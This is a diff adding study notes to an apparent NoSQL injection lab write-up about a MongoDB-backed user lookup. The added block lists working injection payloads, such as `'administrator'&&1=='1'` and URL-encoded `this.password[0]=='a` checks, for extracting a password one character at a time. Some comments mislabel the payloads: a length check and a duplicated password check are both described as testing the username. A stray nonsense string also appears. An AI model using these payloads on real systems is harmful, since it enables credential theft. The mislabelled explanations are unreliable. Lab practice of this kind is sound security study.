@@ -112,10 +112,16 @@ You can alternatively use NoSQL operator injection to extract field names charac
 ### *Lab*
 
 The user lookup functionality for this lab is powered by a MongoDB NoSQL database.
+we have a access control bug in the lookup functionality as we can see data for other accounts that exist 
+we send the payload = `'administrator'&&1=='1'` -  and we are still able to retrieve account data i.e. it is vulnerable to injection 
+```
+'&&username[0]=='a  -  checks if 0th index of username == a
+'%26%26this.password[0]=='a  -  checks if 0th index of password == a
+'%26%26this.password.length=='1  -  checks if 0th index of username == a
+'%26%26this.password[0]=='a  -  checks if 0th index of username == a
 
-
-
-
+```
+sbpknkpr
 
 
 
